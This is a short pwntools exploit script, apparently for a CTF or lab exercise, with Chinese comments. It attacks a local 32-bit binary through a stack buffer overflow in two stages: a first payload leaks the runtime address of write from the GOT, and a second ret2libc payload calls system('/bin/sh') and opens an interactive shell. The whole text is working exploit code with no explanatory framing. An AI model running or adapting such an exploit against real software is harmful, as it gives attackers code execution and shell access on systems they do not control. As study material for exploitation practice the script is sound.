from pwn import *

#输出write函数真实地址
elf = ELF('x86')
p = process('./x86')

vulfun_addr = 0x08049172
plt_write = elf.symbols['write']
got_write = elf.got['write']

payload1 = b'\x90'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)
p.send(payload1)
write_addr = u32(p.recv(4))

print('write_addr=' + hex(write_addr))

#计算system函数和字符串'/bin/sh'真实地址
libc = ELF('/lib32/libc.so.6')

system_addr = int(write_addr) - (libc.symbols['write'] - libc.symbols['system'])
binsh_addr = int(write_addr) - (libc.symbols['write'] - next(libc.search(b'/bin/sh')))

print('system_addr= ' + hex(system_addr))
print('binsh_addr= ' + hex(binsh_addr))

# 利用ret2libc执行system('/bn/sh')
payload2 = b'\x90'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
p.send(payload2)

p.interactive()